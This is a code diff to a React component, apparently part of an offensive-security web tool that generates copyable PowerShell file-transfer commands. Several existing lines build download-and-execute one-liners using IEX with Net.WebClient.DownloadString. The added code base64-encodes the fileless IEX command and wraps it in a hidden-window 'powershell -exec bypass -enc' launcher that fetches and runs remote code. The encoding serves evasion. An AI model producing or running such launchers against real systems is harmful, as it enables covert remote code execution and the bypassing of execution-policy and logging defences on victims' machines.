@@ -28,6 +28,12 @@ export default function FileTransfer () {
     const fileDownload = `(New-Object Net.WebClient).DownloadFile('${ values.target_file_name }','${ values.output_file_name }')`
     const fileDownloadAsync = `(New-Object Net.WebClient).DownloadFileAsync('${ values.target_file_name }','${ values.output_file_name }')`
     const fileLessIEX = `IEX (New-Object Net.WebClient).DownloadString('${ values.target_file_name }')`
+    const encoder = new TextEncoder();
+    const utf16Encoded = encoder.encode(fileLessIEX);
+    const utf16Extended = new Uint8Array(utf16Encoded.length * 2);
+    utf16Encoded.forEach((byte, index) => {utf16Extended[index * 2] = byte;utf16Extended[index * 2 + 1] = 0;});
+    const base64Encoded = btoa(String.fromCharCode.apply(null, utf16Extended));
+    const b64_fileLessIEX = `powershell -exec bypass -WindowStyle Hidden -NoLogo -Noexit -enc "${base64Encoded}"`
     const fileLessIEXPipe = `(New-Object Net.WebClient).DownloadString('${ values.target_file_name }') | IEX`
     const iwr = `iwr -Uri '${ values.target_file_name }' -OutFile '${ values.output_file_name }'`
     const InvokeWebRequest = `Invoke-WebRequest -Uri '${ values.target_file_name }' -OutFile '${ values.output_file_name }'`
@@ -148,6 +154,13 @@ ftp -v -s:ftp.txt`
                         <pre>
                             <Text copyable>
                                 {fileLessIEXPipe}
+                            </Text>
+                        </pre>
+                    </Text>
+                    <Text>
+                        <pre>
+                            <Text copyable>
+                                {b64_fileLessIEX}
                             </Text>
                         </pre>
                     </Text>
